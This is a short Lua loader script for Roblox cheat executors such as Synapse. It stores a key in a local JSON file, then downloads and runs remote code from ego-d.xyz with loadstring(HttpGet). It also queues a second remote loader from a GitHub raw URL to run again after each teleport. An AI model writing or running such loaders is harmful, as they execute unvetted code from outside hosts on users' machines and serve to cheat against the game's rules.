print('da execute')
local buoi_cua_rua = isfile("Zua_hap_key.json")

if buoi_cua_rua then
    local Buoi = game:GetService("HttpService"):JSONDecode(readfile("Zua_hap_key.json"))
    getgenv().Key = Buoi["Product Key"]
    
    else
    local Buoi = {}
    Buoi["Product Key"] = getgenv().Key 
	writefile("Zua_hap_key.json", game:GetService("HttpService"):JSONEncode(Buoi))
end
local Exploit = secure_load and "Sentinel" or syn and "Synapse"
loadstring(game:HttpGet("https://ego-d.xyz/Script?Exploit="..Exploit))()
local buoi = [[
loadstring(game:HttpGet('https://raw.githubusercontent.com/chimnguu/ngu/master/zua_buoi.lua'))()
]]

syn.queue_on_teleport(buoi)
